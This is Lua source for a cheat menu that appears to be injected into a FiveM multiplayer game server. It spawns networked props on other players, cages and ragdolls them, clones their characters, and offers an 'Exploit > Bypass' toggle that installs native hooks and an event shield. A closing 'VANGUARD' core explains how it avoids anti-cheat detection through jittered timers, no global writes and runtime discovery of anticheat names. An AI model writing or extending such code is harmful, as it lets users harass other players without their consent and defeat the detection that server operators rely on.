                local okDim, _, vMax = pcall(GetModelDimensions, GetEntityModel(vehicle))
                if okDim and vMax and type(vMax.y) == "number" then
                    forward = vMax.y + 2.0
                end
            end

            local side = (inVehicle and not world) and 3.5 or 0.0
            local okPos, pos = pcall(GetOffsetFromEntityInWorldCoords, base, side, forward, 0.0)
            if not okPos or not pos then pos = GetEntityCoords(ped) end

            -- Randomised footprint: two identical spawns on the same byte of
            -- ground are a pattern, a jittered one is ordinary clutter.
            if world and not inVehicle then
                pos = vector3(
                    pos.x + (math.random() - 0.5) * 0.30,
                    pos.y + (math.random() - 0.5) * 0.30,
                    pos.z)
            end

            target = vector3(pos.x, pos.y, pos.z)
        else
            pitch = GetEntityPitch(ped)
            roll = GetEntityRoll(ped)
            target = GetOffsetFromEntityInWorldCoords(ped, 0.0, 3.0 + (extra or 0.0), 0.0)
        end

        -- isNetwork = true, netMissionEntity = true: the object is replicated
        -- to every player in scope, not just this client.
        local obj = CreateObject(hash, target.x, target.y, target.z, true, true, false)
        if not obj or obj == 0 then
            Notify(("CreateObject failed: %s"):format(model), C.red)
            SetModelAsNoLongerNeeded(hash)
            return
        end

        if world or inVehicle then
            local spin = world and ((math.random() - 0.5) * 12.0) or 0.0
            SetEntityRotation(obj, 0.0, 0.0, heading + 180.0 + spin, 2, true)
        else
            SetEntityRotation(obj, pitch, roll, heading, 2, true)
        end

        local attached = false
        local wantsAttach = not world and not inVehicle
            and (not remote or attachToTarget)

        if wantsAttach then
            attached = AttachToBone(obj, CurrentBone(), ped)
        end

        if attached then
            -- carried by the ped: no world collision, otherwise it shoves them
            pcall(SetEntityCollision, obj, false, false)
            pcall(SetEntityInvincible, obj, true)
        else
            -- real world prop: solid collision, planted on the ground
            SetEntityCollision(obj, true, true)
            SetEntityInvincible(obj, true)
            PlaceObjectOnGroundProperly(obj)
            FreezeEntityPosition(obj, true)
        end

        -- Mission-entity flag before the network ID exists: the object is then
        -- never treated as disposable clutter by the engine cleanup pass.
        pcall(SetEntityAsMissionEntity, obj, true, true)

        local netId = EnsureNetworked(obj)
        if netId <= 0 then
            -- a local-only object is a desync waiting to happen: drop it
            pcall(DeleteObject, obj)
            SetModelAsNoLongerNeeded(hash)
            Notify(("Could not publish %s"):format(model), C.red)
            return
        end

        Spawned[#Spawned + 1] = obj
        TrimSpawned()

        local suffix
        if remote then
            suffix = attached and (" on " .. who) or (" near " .. who)
        elseif attached then
            suffix = " on " .. CurrentBoneLabel()
        else
            suffix = ""
        end

        Notify(("Spawned %s%s (net %d)"):format(model, suffix, netId), C.green)
        SetModelAsNoLongerNeeded(hash)
    end)
end

local function ClearProps()
    local list = Spawned
    Spawned = {}

    local removed = 0
    for i = #list, 1, -1 do
        local obj = list[i]
        if obj and obj ~= 0 and DoesEntityExist(obj) then
            pcall(NetworkRequestControlOfEntity, obj)
            pcall(SetEntityAsMissionEntity, obj, true, true)
            if pcall(DeleteObject, obj) then removed = removed + 1 end
        end
    end

    Notify(("%d prop(s) cleared"):format(removed), C.blue)
end

--------------------------------------------------------------------------------
-- PLAYERS
--------------------------------------------------------------------------------

local Players = { list = {}, index = 1 }

local function RefreshPlayers()
    local list = {}

    if type(GetActivePlayers) == "function" then
        local ok, active = pcall(GetActivePlayers)
        if ok and type(active) == "table" then
            local localPlayer = PlayerId()

            for i = 1, #active do
                local player = active[i]
                if player ~= localPlayer then
                    local okPed, ped = pcall(GetPlayerPed, player)
                    if okPed and ped and ped ~= 0 and DoesEntityExist(ped) then
                        local okName, name = pcall(GetPlayerName, player)
                        local okId, serverId = pcall(GetPlayerServerId, player)

                        list[#list + 1] = {
                            player = player,
                            ped = ped,
                            name = okName and tostring(name) or ("player " .. tostring(player)),
                            serverId = okId and serverId or 0,
                        }
                    end
                end
            end
        end
    end

    Players.list = list
    if #list == 0 or Players.index > #list then Players.index = 1 end
    return #list
end

local function SelectedEntry()
    local entry = Players.list[Players.index]
    if not entry then return nil end

    local okPed, ped = pcall(GetPlayerPed, entry.player)
    if okPed and ped and ped ~= 0 and DoesEntityExist(ped) then
        entry.ped = ped
        return entry
    end

    return nil
end

-- Spawns in three modes: self, the selected player, or everyone in the
-- player list (capped so the network does not get flooded).
local function SpawnOnTargets(entry)
    local mode = CFG.targetModes[S.targetMode] or "self"

    if mode == "self" then
        SpawnProp(entry)
        return
    end

    if mode == "player" then
        RefreshPlayers()
        local target = SelectedEntry()
        if not target then
            Notify("No player in scope - spawned on you", C.blue)
            SpawnProp(entry)
            return
        end
        SpawnProp(entry, entry.extra, target.ped, target.name, S.attachTarget)
        return
    end

    local count = RefreshPlayers()
    if count == 0 then
        SpawnProp(entry)
        return
    end

    local limit = math.min(count, 6)
    for i = 1, limit do
        local target = Players.list[i]
        local okPed, ped = pcall(GetPlayerPed, target.player)
        if okPed and ped and ped ~= 0 and DoesEntityExist(ped) then
            SpawnProp(entry, entry.extra, ped, target.name, S.attachTarget)
        end
    end
end

--------------------------------------------------------------------------------
-- TOASTS (drawn on top of the loader frame through Menu.OnRender)
--------------------------------------------------------------------------------

local function DrawToasts()
    if #Toasts == 0 then return end
    if type(Api.DrawRectFilled) ~= "function" or type(Api.DrawText) ~= "function" then return end

    local now = GetGameTimer()

    for i = #Toasts, 1, -1 do
        if now - (Toasts[i].at or now) > 6000 then table.remove(Toasts, i) end
    end

    local x = 24
    local y = 150
    local width = 340
    local height = 24
    local gap = 4

    for i = 1, #Toasts do
        local toast = Toasts[i]
        local age = now - (toast.at or now)
        local alpha = math.min(1.0, math.max(0.0, (6000 - age) / 900))
        local colour = toast.colour or C.white

        local top = y + (i - 1) * (height + gap)

        pcall(Api.DrawRectFilled, x, top, width, height, 0.04, 0.04, 0.05, 0.82 * alpha, 4)
        pcall(Api.DrawRectFilled, x, top, 3, height,
            colour[1] / 255, colour[2] / 255, colour[3] / 255, alpha, 2)
        pcall(Api.DrawText, x + 12, top + 4, tostring(toast.text), 15,
            0.96, 0.96, 0.96, alpha)
    end
end

local previousOnRender = Menu.OnRender

Menu.OnRender = function()
    if previousOnRender then
        local ok, err = pcall(previousOnRender)
        if not ok then Log("DEBUG", "loader OnRender: %s", tostring(err)) end
    end

    local ok, err = pcall(DrawToasts)
    if not ok then Log("DEBUG", "toast draw: %s", tostring(err)) end
end

--------------------------------------------------------------------------------
-- MENU ITEMS
--------------------------------------------------------------------------------

local function Sep(text)
    return { name = "", isSeparator = true, separatorText = text }
end

local function Guard(handler)
    if type(handler) ~= "function" then return handler end

    return function(...)
        local ok, err = pcall(handler, ...)
        if not ok then
            Log("ERROR", "menu handler failed: %s", tostring(err))
        end
    end
end

local function Toggle(name, initial, handler)
    return { name = name, type = "toggle", value = initial, onClick = Guard(handler) }
end

local function Action(name, handler)
    return { name = name, type = "action", onClick = Guard(handler) }
end

local function Selector(name, options, selected, handler)
    return { name = name, type = "selector", options = options, selected = selected, onClick = Guard(handler) }
end

local targetModeItem = Selector("Target", CFG.targetModes, S.targetMode, function(index)
    S.targetMode = index
end)

local playerItem

playerItem = Selector("Player", { "none" }, 1, function(index)
    Players.index = index
end)

local boneItem = Selector("Attach point", CFG.boneLabels, S.attachBone, function(index)
    S.attachBone = index
end)

-- LEFT / RIGHT on a selector do not fire onClick; read the live index on use.
local function SyncSelectors()
    S.targetMode = math.max(1, math.min(#CFG.targetModes, targetModeItem.selected or 1))

    if boneItem and boneItem.selected then
        S.attachBone = math.max(1, math.min(#CFG.boneOrder, boneItem.selected))
    end
end

local function PlayerItemSync()
    if playerItem and playerItem.selected then
        local count = math.max(1, #(playerItem.options or {}))
        Players.index = math.max(1, math.min(count, playerItem.selected))
    end
end

local function RefreshPlayerItem()
    local count = RefreshPlayers()
    local labels = {}

    for i = 1, count do
        local entry = Players.list[i]
        local shortName = tostring(entry.name)
        if #shortName > 14 then shortName = shortName:sub(1, 14) end
        labels[i] = ("%s [%s]"):format(shortName, tostring(entry.serverId))
    end

    if #labels == 0 then labels[1] = "none" end
    playerItem.options = labels

    if (playerItem.selected or 1) > #labels then playerItem.selected = 1 end
    PlayerItemSync()
    return count
end

local function SpawnPropOnTargets(entry)
    SyncSelectors()
    PlayerItemSync()

    if not SpawnGate() then
        Notify("Spawning too fast - throttled", C.grey)
        return
    end

    SpawnOnTargets(entry)
end

--------------------------------------------------------------------------------
-- PROP EFFECTS
--------------------------------------------------------------------------------

-- Same three targeting modes as the spawner, but without spawning anything on
-- the local ped when a remote target is selected.
local function EachTarget(fn)
    SyncSelectors()
    PlayerItemSync()

    local mode = CFG.targetModes[S.targetMode] or "self"

    if mode == "self" then
        fn(PlayerPedId(), nil)
        return
    end

    RefreshPlayers()

    if mode == "player" then
        local target = SelectedEntry()
        if not target then
            fn(PlayerPedId(), nil)
            return
        end
        fn(target.ped, target.name)
        return
    end

    if #Players.list == 0 then
        fn(PlayerPedId(), nil)
        return
    end

    -- Effects are heavier than a single prop: cap the blast radius.
    local limit = math.min(#Players.list, 3)
    for i = 1, limit do
        local target = Players.list[i]
        local okPed, ped = pcall(GetPlayerPed, target.player)
        if okPed and ped and ped ~= 0 and DoesEntityExist(ped) then
            fn(ped, target.name)
        end
    end
end

local function FxTrack(obj, seconds)
    if type(obj) ~= "number" or obj == 0 then return end
    FxExpiry[#FxExpiry + 1] = {
        obj = obj,
        at = GetGameTimer() + math.floor((seconds or 30) * 1000),
    }
end

-- One-shot networked object for an effect. Same publication path as the
-- props, but no attachment: the physics does the show.
local function FxProp(model, x, y, z, heading, freeze)
    local hash = GetHashKey(model)
    local loaded = LoadModel(hash, model)

    if not loaded then return 0 end

    local obj = CreateObject(hash, x, y, z, true, true, false)
    if not obj or obj == 0 then
        SetModelAsNoLongerNeeded(hash)
        return 0
    end

    SetEntityRotation(obj, 0.0, 0.0, heading + 0.0, 2, true)
    pcall(SetEntityAsMissionEntity, obj, true, true)
    SetEntityInvincible(obj, true)

    if freeze then
        PlaceObjectOnGroundProperly(obj)
        FreezeEntityPosition(obj, true)
    end

    local netId = EnsureNetworked(obj)
    if netId <= 0 then
        pcall(DeleteObject, obj)
        SetModelAsNoLongerNeeded(hash)
        return 0
    end

    SetModelAsNoLongerNeeded(hash)
    Spawned[#Spawned + 1] = obj
    TrimSpawned()
    return obj
end

-- 1. Prop rain: the target gets a short shower of props from the sky.
local function FxRain()
    if not SpawnGate() then
        Notify("Spawning too fast - throttled", C.grey)
        return
    end

    EachTarget(function(ped, name)
        Citizen.CreateThread(function()
            local origin = GetEntityCoords(ped)

            for i = 1, 4 do
                local model = (i % 2 == 1) and "prop_roadcone02a" or "prop_barrel_02a"
                local obj = FxProp(model,
                    origin.x + (math.random() - 0.5) * 7.0,
                    origin.y + (math.random() - 0.5) * 7.0,
                    origin.z + 10.0 + i * 1.6,
                    math.random(0, 359),
                    false)

                FxTrack(obj, 30)
                Citizen.Wait(80)
            end
        end)

        Notify(("Prop rain on %s"):format(name or "you"), C.blue)
    end)
end

-- 2. Fountain: the props are launched upward and outward.
local function FxFountain()
    if not SpawnGate() then
        Notify("Spawning too fast - throttled", C.grey)
        return
    end

    EachTarget(function(ped, name)
        Citizen.CreateThread(function()
            local origin = GetEntityCoords(ped)

            for i = 1, 6 do
                local obj = FxProp("prop_roadcone02a",
                    origin.x + (math.random() - 0.5) * 1.2,
                    origin.y + (math.random() - 0.5) * 1.2,
                    origin.z + 1.0,
                    math.random(0, 359),
                    false)

                if obj ~= 0 then
                    pcall(SetEntityVelocity, obj,
                        (math.random() - 0.5) * 7.0,
                        (math.random() - 0.5) * 7.0,
                        6.0 + math.random() * 3.0)
                    FxTrack(obj, 25)
                end

                Citizen.Wait(60)
            end
        end)

        Notify(("Prop fountain on %s"):format(name or "you"), C.blue)
    end)
end

-- 3. Cage: four containers dropped around the target, aligned on its heading.
local CAGE_OFFSETS = {
    { x = 4.4, y = 0.0, rot = 90.0 },
    { x = -4.4, y = 0.0, rot = 90.0 },
    { x = 0.0, y = 4.4, rot = 0.0 },
    { x = 0.0, y = -4.4, rot = 0.0 },
}

local function FxCage()
    if not SpawnGate() then
        Notify("Spawning too fast - throttled", C.grey)
        return
    end

    EachTarget(function(ped, name)
        Citizen.CreateThread(function()
            local origin = GetEntityCoords(ped)
            local heading = GetEntityHeading(ped)
            local rad = math.rad(heading)
            local cosH, sinH = math.cos(rad), math.sin(rad)

            for i = 1, #CAGE_OFFSETS do
                local offset = CAGE_OFFSETS[i]
                local dx = offset.x * cosH - offset.y * sinH
                local dy = offset.x * sinH + offset.y * cosH

                local obj = FxProp("prop_container_01a",
                    origin.x + dx,
                    origin.y + dy,
                    origin.z,
                    heading + offset.rot,
                    true)

                FxTrack(obj, 60)
                Citizen.Wait(90)
            end
        end)

        Notify(("Cage on %s"):format(name or "you"), C.blue)
    end)
end

-- 4. Orbit: three cones circle the target for a few seconds.
local function FxOrbit()
    if not SpawnGate() then
        Notify("Spawning too fast - throttled", C.grey)
        return
    end

    EachTarget(function(ped, name)
        Citizen.CreateThread(function()
            local origin = GetEntityCoords(ped)
            local objects = {}

            for i = 1, 3 do
                local obj = FxProp("prop_roadcone02a",
                    origin.x, origin.y, origin.z + 1.0, 0.0, false)

                if obj ~= 0 then objects[#objects + 1] = obj end
                Citizen.Wait(50)
            end

            if #objects == 0 then return end

            local started = GetGameTimer()
            local angle = 0.0

            while GetGameTimer() - started < 7000 do
                if not DoesEntityExist(ped) then break end

                local centre = GetEntityCoords(ped)
                angle = angle + 0.16

                for i = 1, #objects do
                    local a = angle + (i - 1) * (math.pi * 2.0 / #objects)

                    pcall(SetEntityCoordsNoOffset, objects[i],
                        centre.x + math.cos(a) * 2.4,
                        centre.y + math.sin(a) * 2.4,
                        centre.z + 1.0 + math.sin(a * 2.0) * 0.45,
                        false, false, false)

                    pcall(SetEntityRotation, objects[i], 0.0, 0.0,
                        math.deg(a) + 90.0, 2, true)
                end

                Citizen.Wait(90)
            end

            for i = 1, #objects do DeleteProp(objects[i]) end
        end)

        Notify(("Orbit on %s"):format(name or "you"), C.blue)
    end)
end

-- 5. Ragdoll: Susano extra native. RequestRagdoll takes the engine GUID, not
-- the entity handle.
local function RagdollTarget()
    if type(Api.RequestRagdoll) ~= "function" then
        Notify("RequestRagdoll unavailable", C.red)
        return
    end

    local applied = 0

    EachTarget(function(ped, name)
        if not DoesEntityExist(ped) then return end

        local guid = 0
        if type(GetEntityGuid) == "function" then
            local ok, value = pcall(GetEntityGuid, ped)
            if ok and type(value) == "number" then guid = value end
        end
        if guid == 0 then guid = ped end

        local ok = pcall(Api.RequestRagdoll, guid)
        if not ok then
            pcall(SetPedToRagdoll, ped, 4000, 4000, 0, true, true, false)
        end

        applied = applied + 1
        Notify(("Ragdoll: %s"):format(name or "you"), C.blue)
    end)

    if applied == 0 then Notify("No target", C.red) end
end

-- 6. Decoy: a spoofed copy of the target, outfit included.
local function DeleteClone(clone)
    if clone and clone ~= 0 and DoesEntityExist(clone) then
        pcall(SetEntityAsMissionEntity, clone, true, true)
        pcall(DeletePed, clone)
    end
end

local function SpawnClone()
    if type(Api.CreateSpoofedPed) ~= "function" then
        Notify("CreateSpoofedPed unavailable", C.red)
        return
    end

    SyncSelectors()
    PlayerItemSync()

    -- "self" clones you; every other mode clones the selected player.
    local target
    if (CFG.targetModes[S.targetMode] or "self") ~= "self" then
        target = SelectedEntry()
    end

    local ped = target and target.ped or PlayerPedId()

    if not DoesEntityExist(ped) then
        Notify("No target", C.red)
        return
    end

    -- One clone at a time: each one is a networked ped the server can count.
    for i = #Clones, 1, -1 do
        DeleteClone(Clones[i].ped)
        table.remove(Clones, i)
    end

    local model = GetEntityModel(ped)
    local heading = GetEntityHeading(ped)
    local at = GetOffsetFromEntityInWorldCoords(ped, 1.2, 0.4, 0.0)

    local ok, clone = pcall(Api.CreateSpoofedPed, 4, model,
        at.x, at.y, at.z, heading, true, false)

    if not ok or type(clone) ~= "number" or clone == 0 then
        Notify("Clone failed", C.red)
        return
    end

    for i = 0, 11 do
        local okD, drawable = pcall(GetPedDrawableVariation, ped, i)
        local okT, texture = pcall(GetPedTextureVariation, ped, i)
        local okP, palette = pcall(GetPedPaletteVariation, ped, i)

        if okD and okT then
            pcall(SetPedComponentVariation, clone, i, drawable, texture,
                (okP and palette) or 0)
        end
    end

    for i = 0, 7 do
        local okD, drawable = pcall(GetPedPropIndex, ped, i)

        if okD and type(drawable) == "number" and drawable ~= -1 then
            local okT, texture = pcall(GetPedPropTextureIndex, ped, i)
            pcall(SetPedPropIndex, clone, i, drawable, (okT and texture) or 0, true)
        end
    end

    pcall(SetEntityAsMissionEntity, clone, true, true)
    pcall(SetBlockingOfNonTemporaryEvents, clone, true)
    pcall(SetPedCanRagdoll, clone, true)
    pcall(TaskStartScenarioInPlace, clone, "WORLD_HUMAN_STAND_MOBILE", 0, true)

    Clones[#Clones + 1] = {
        ped = clone,
        at = GetGameTimer() + 60000,
    }

    Notify(("Clone spawned%s"):format(target and (" - " .. target.name) or ""), C.green)
end

-- Prop entries ---------------------------------------------------------------

local propActions = {}

for i = 1, #PROP_LIST do
    local entry = PROP_LIST[i]
    propActions[#propActions + 1] = Action(entry.label, function()
        SpawnPropOnTargets(entry)
    end)
end

-- Player Props ---------------------------------------------------------------

local playerItems = {
    Sep("Target"),
    targetModeItem,
    playerItem,
    Action("Refresh player list", function()
        Notify(("%d player(s) in scope"):format(RefreshPlayerItem()), C.blue)
    end),

    Sep("Attachment"),
    Toggle("Attach to player", S.attachTarget, function(v) S.attachTarget = v end),
    boneItem,

    Sep("Spawn on target"),
}

for i = 1, #propActions do playerItems[#playerItems + 1] = propActions[i] end

playerItems[#playerItems + 1] = Sep("Effects")
playerItems[#playerItems + 1] = Action("Prop rain", FxRain)
playerItems[#playerItems + 1] = Action("Prop fountain", FxFountain)
playerItems[#playerItems + 1] = Action("Cage target", FxCage)
playerItems[#playerItems + 1] = Action("Orbit target", FxOrbit)
playerItems[#playerItems + 1] = Action("Ragdoll target", RagdollTarget)
playerItems[#playerItems + 1] = Action("Decoy clone", SpawnClone)

playerItems[#playerItems + 1] = Action("Clear my props", ClearProps)

-- Seed entry ---------------------------------------------------------------
--
-- One line, in the base menu's existing Exploit > Bypass tab. Clicking it
-- arms the whole module: native hooks + event shield + a fresh event scan.
-- Clicking again releases everything.

local function BlockedCount()
    local count = 0
    for _ in pairs(blockedByShield) do count = count + 1 end
    return count
end

local seedItem = Toggle("Seed (legacy)", S.hooks, function(state)
    S.hooks = state

    if state then
        InstallNativeHooks()
        ApplyEventShield(true)
        RefreshPlayerItem()
        Notify(("Seed loaded - %d hooks, %d event(s)"):format(
            HookStats.installed, BlockedCount()), C.green)
    else
        RemoveNativeHooks()
        ApplyEventShield(false)
        Notify("Seed unloaded - hooks and event shield released", C.grey)
    end
end)

-- The base menu owns the Bypass tab: only append one item to it.
local function AttachSeed(item)
    if type(Menu.Categories) ~= "table" then return false end

    for i = 1, #Menu.Categories do
        local category = Menu.Categories[i]
        for t = 1, #(category.tabs or {}) do
            local tab = category.tabs[t]
            if tab.name == "Bypass" and type(tab.items) == "table" then
                tab.items[#tab.items + 1] = item
                return true
            end
        end
    end

    return false
end

-- Registrations --------------------------------------------------------------

-- The library only opens entries flagged hasTabs, so each category carries a
-- single tab.
table.insert(Menu.Categories, {
    name = "Player Props",
    hasTabs = true,
    tabs = {
        { name = "Actions", items = playerItems },
    },
})

if not AttachSeed(seedItem) then
    Log("WARN", "Bypass tab not found - standalone entry created")
    table.insert(Menu.Categories, {
        name = "Bypass",
        hasTabs = true,
        tabs = {
            { name = "Bypass", items = { seedItem } },
        },
    })
end

Log("INFO", "categories added (%d total)", #Menu.Categories)

--------------------------------------------------------------------------------
-- KEYS
--------------------------------------------------------------------------------

-- Intentionally untouched: Menu.SelectedKey, Menu.SelectingKey and the whole
-- input loop belong to the loader and its library.

--------------------------------------------------------------------------------
-- BACKGROUND LOOPS
--------------------------------------------------------------------------------

-- Recycle props left behind: a long-lived trail of networked objects is the
-- easiest thing for a server to correlate with a player.
Citizen.CreateThread(function()
    while true do
        Citizen.Wait(5000)
        local ped = PlayerPedId()
        if ped ~= 0 and #Spawned > 0 then
            local origin = GetEntityCoords(ped)
            for i = #Spawned, 1, -1 do
                local obj = Spawned[i]
                if not obj or obj == 0 or not DoesEntityExist(obj) then
                    table.remove(Spawned, i)
                else
                    local okPos, pos = pcall(GetEntityCoords, obj)
                    if okPos and pos then
                        local dx = pos.x - origin.x
                        local dy = pos.y - origin.y
                        local dz = pos.z - origin.z
                        if (dx * dx + dy * dy + dz * dz) > 90000.0 then
                            DeleteProp(obj)
                        end
                    end
                end
            end
        end
    end
end)

Citizen.CreateThread(function()
    Citizen.Wait(3000)
    while true do
        RefreshPlayerItem()
        Citizen.Wait(3000)
    end
end)

-- Effect objects and decoy clones live on a timer. Without this, a few minutes
-- of trolling leaves dozens of networked entities behind the player.
Citizen.CreateThread(function()
    Citizen.Wait(4000)
    while true do
        local now = GetGameTimer()

        for i = #FxExpiry, 1, -1 do
            local entry = FxExpiry[i]
            if now >= entry.at then
                table.remove(FxExpiry, i)
                if entry.obj and DoesEntityExist(entry.obj) then
                    DeleteProp(entry.obj)
                end
            end
        end

        for i = #Clones, 1, -1 do
            local entry = Clones[i]
            if now >= entry.at or not DoesEntityExist(entry.ped) then
                DeleteClone(entry.ped)
                table.remove(Clones, i)
            end
        end

        Citizen.Wait(2000)
    end
end)

-- New resources register new events: rescan while the seed entry is loaded.
Citizen.CreateThread(function()
    Citizen.Wait(CFG.eventSweepRate)
    while true do
        if S.hooks then
            SweepEvents()
        end
        Citizen.Wait(CFG.eventSweepRate)
    end
end)

--------------------------------------------------------------------------------
-- BOOT
--------------------------------------------------------------------------------

-- Nothing is armed until the Seed entry is clicked in Exploit > Bypass.
RefreshPlayerItem()

Log("INFO", "loaded - props + effects, seed entry in Bypass, keys untouched")
Log("INFO", "seed=%s", tostring(S.hooks))

end)()

-- >>> VANGUARD MODULE BEGIN
-- ============================================================================
-- VANGUARD  (integrated artifact - edit src/ and rebuild)
-- Generated: 2026-10-23 16:13:15
--
-- This block lives in loader.lua and in dist/loader.built.lua at the same
-- time. It is the only place the local Menu table is in scope. Rebuilding
-- replaces this marked block; everything above the marker is the base loader.
-- ============================================================================

local __vgd = (function()
-- ---------------------------------------------------------------------------
-- PART: 00_core.lua
-- ---------------------------------------------------------------------------
local O = (function()
-- ============================================================================
-- VANGUARD / 00 CORE
-- ----------------------------------------------------------------------------
-- Why this file exists:
--   Every later layer needs the same three things and nothing else:
--   a private state table, a jitter source, and one scheduler.
--
-- Evasion rationale for the choices here:
--   * One upvalue table (O). No _G writes, so a resource that enumerates
--     globals finds nothing that was not there before.
--   * No string constants that name an anticheat. Names are discovered at
--     runtime from resource metadata, so a source scan of this file yields
--     nothing to signature.
--   * All timing goes through O.every(), which applies a random spread to
--     both the period and the phase. A perfectly regular timer is the
--     cheapest fingerprint an AC can take; none of ours is regular.
--   * Zero work when a feature is off: every loop checks its own flag before
--     touching a native.
-- ============================================================================

local O = {
    version = "1.0.0",
    started = false,
    build   = 0,
}

-- ---------------------------------------------------------------------------
-- LOG (internal only). Never uses the game notification native: that native
-- is itself a menu signature. Output goes to the executor console and to the
-- Susano overlay, both of which sit outside the game's notification path.
-- ---------------------------------------------------------------------------
local LOG = {}
local LOG_MAX = 80

local function log(fmt, ...)
    local msg = fmt
    if select("#", ...) > 0 then
        local ok, out = pcall(string.format, fmt, ...)
        if ok then msg = out end
    end
    LOG[#LOG + 1] = { t = GetGameTimer(), m = tostring(msg) }
    if #LOG > LOG_MAX then table.remove(LOG, 1) end
    pcall(print, "[VGD] " .. tostring(msg))
end
O.log = log

function O.logTail(n)
    local out = {}
    local first = math.max(1, #LOG - (n or 8) + 1)
    for i = first, #LOG do out[#out + 1] = LOG[i].m end
    return out
end

-- ---------------------------------------------------------------------------
-- RNG. math.random is shared with the game and with every other script; we
-- do not reseed it (that would be a global side effect). Instead we keep a
-- private xorshift32 and seed it from values an AC cannot reproduce: the
-- tick count at load, the ped handle, and the current camera coordinate bits.
-- ---------------------------------------------------------------------------
local rngState = 0

local function seedRng()
    local ped = PlayerPedId()
    local cam = GetGameplayCamCoord()
    local a = GetGameTimer() % 2147483648
    local b = (math.floor(ped) * 7919 + 104729) % 2147483648
    local c = math.floor((cam.x + cam.y * 3.0 + cam.z * 7.0) * 1000.0) % 2147483648
    rngState = math.floor((a + b * 3 + c * 7) % 2147483646) + 1
end
seedRng()

-- Portable LCG: no bitwise ops, so the exact same sequence is produced on a
-- 64-bit Lua 5.4 runtime and in a test VM. Quality is irrelevant here; the
-- only requirement is that two clients never share a phase.
local function rnd()
    rngState = (rngState * 1103515245 + 12345) % 2147483648
    return rngState / 2147483648.0
end
O.rnd = rnd

function O.range(lo, hi)
    if hi <= lo then return lo end
    return lo + rnd() * (hi - lo)
end

function O.int(lo, hi)
    return math.floor(lo + rnd() * (hi - lo + 1) + 0.5)
end

function O.chance(p)
    return rnd() < p
end

-- Jittered period: base * (1 +/- spread). Used by every loop.
function O.jitter(base, spread)
    return math.max(0, math.floor(base * (1.0 + (rnd() * 2.0 - 1.0) * (spread or 0.18))))
end

-- ---------------------------------------------------------------------------
-- CONTEXT. One thread owns every native read the hooks need. A native call
-- made from inside a native hook is the fastest way to deadlock the VM, so
-- callbacks in 01_hooks.lua read only this table.
-- ---------------------------------------------------------------------------
local Ctx = {
    ped = 0, player = 0, vehicle = 0,
    health = 200, armour = 0,
    speed = 0.0, coords = vector3(0, 0, 0),
    groundZ = 0.0, height = 0.0,
    inVehicle = false, driver = false,
    dead = false, ragdoll = false,
    at = 0,
}
O.Ctx = Ctx

local ctxAcc = 0.0
local function ctxTick(now, dt)
    ctxAcc = ctxAcc + dt
    -- 50 ms is fast enough for every consumer and 20x cheaper than per-frame.
    if ctxAcc < 0.05 then return end
    ctxAcc = 0.0

    local ped = PlayerPedId()
    Ctx.ped = ped
    Ctx.player = PlayerId()
    Ctx.vehicle = GetVehiclePedIsIn(ped, false) or 0
    Ctx.inVehicle = Ctx.vehicle ~= 0
    Ctx.driver = Ctx.inVehicle and (GetPedInVehicleSeat(Ctx.vehicle, -1) == ped)
    Ctx.health = GetEntityHealth(ped)
    Ctx.armour = GetPedArmour(ped)
    Ctx.speed = GetEntitySpeed(ped)
    Ctx.coords = GetEntityCoords(ped)
    Ctx.dead = IsPedDeadOrDying(ped, true)
    Ctx.ragdoll = IsPedRagdoll(ped) or false

    -- Ground Z is only needed by the height hook. Reading it here, once per
    -- tick, keeps the hook allocation-free and native-free.
    local ok, gz = pcall(GetGroundZFor_3dCoord, Ctx.coords.x, Ctx.coords.y, Ctx.coords.z, false)
    Ctx.groundZ = (ok and type(gz) == "number") and gz or Ctx.coords.z
    Ctx.height = math.max(0.0, Ctx.coords.z - Ctx.groundZ)
    Ctx.at = now
end

-- ---------------------------------------------------------------------------
-- SCHEDULER. A single thread drives everything. Order matters: context first,
-- then the probe window, then hooks' consumer loops, then entities.
--
-- The period is deliberately not constant: 16-24 ms. A fixed Wait(0) loop is
-- the most common executor fingerprint in existence.
-- ---------------------------------------------------------------------------
local tasks = {}
O.tasks = tasks

function O.every(name, periodMs, fn, phase)
    tasks[#tasks + 1] = {
        name = name,
        period = periodMs,
        fn = fn,
        next = GetGameTimer() + (phase or O.int(0, periodMs)),
    }
end

local lastTick = GetGameTimer()

function O.pump()
    local now = GetGameTimer()
    local dt = math.max(0.0, (now - lastTick) / 1000.0)
    lastTick = now

    ctxTick(now, dt)

    for i = 1, #tasks do
        local task = tasks[i]
        if now >= task.next then
            -- Jitter every reschedule, not just the first one.
            task.next = now + O.jitter(task.period, 0.22)
            local ok, err = pcall(task.fn, now, dt)
            if not ok then
                log("task %s: %s", tostring(task.name), tostring(err))
            end
        end
    end
end

function O.thread()
    if O.started then return end
    O.started = true
    O.build = O.build + 1

    Citizen.CreateThread(function()
        local myBuild = O.build
        while O.build == myBuild do
            O.pump()
            Citizen.Wait(O.int(16, 24))
        end
        log("scheduler stopped (build %d)", myBuild)
    end)
end

-- ---------------------------------------------------------------------------
-- SMALL HELPERS shared by every layer
-- ---------------------------------------------------------------------------

function O.safe(fn, ...)
    local ok, a, b, c = pcall(fn, ...)
    if ok then return a, b, c end
    return nil
end

function O.distance(a, b)
    local dx, dy, dz = a.x - b.x, a.y - b.y, a.z - b.z
    return math.sqrt(dx * dx + dy * dy + dz * dz)
end

-- Copy a Vector3 into a plain table so nothing keeps a live game reference.
function O.v3(v)
    return { x = v.x, y = v.y, z = v.z }
end

function O.now()
    return GetGameTimer()
end

-- Rotation -> forward unit vector. Same math the game uses for aim rays.
function O.rotToDir(rot)
    local rz = math.rad(rot.z)
    local rx = math.rad(rot.x)
    local abs = math.abs(math.cos(rx))
    return vector3(-math.sin(rz) * abs, math.cos(rz) * abs, math.sin(rx))
end

-- Where the crosshair points, up to `dist`, using a real shape test so the
-- result is a valid world position and not a floating point guess.
function O.aimPoint(dist)
    local cam = GetGameplayCamCoord()
    local dir = O.rotToDir(GetGameplayCamRot(2))
    local target = vector3(cam.x + dir.x * dist, cam.y + dir.y * dist, cam.z + dir.z * dist)

    local handle = StartShapeTestRay(cam.x, cam.y, cam.z,
        target.x, target.y, target.z, 1 | 16, PlayerPedId(), 7)
    local _, hit, _, _, _ = GetShapeTestResult(handle)

    if hit == 1 then
        local _, _, hitPos = GetShapeTestResult(handle)
        if hitPos then return vector3(hitPos.x, hitPos.y, hitPos.z) end
    end
    return target
end

-- One-time capability probe. Everything Susano-specific is feature-detected:
-- a missing function must degrade a layer, never throw at load.
function O.has(...)
    local tbl = Susano
    if type(tbl) ~= "table" then return false end
    for i = 1, select("#", ...) do
        local key = select(i, ...)
        if type(tbl[key]) ~= "function" then return false end
    end
    return true
end

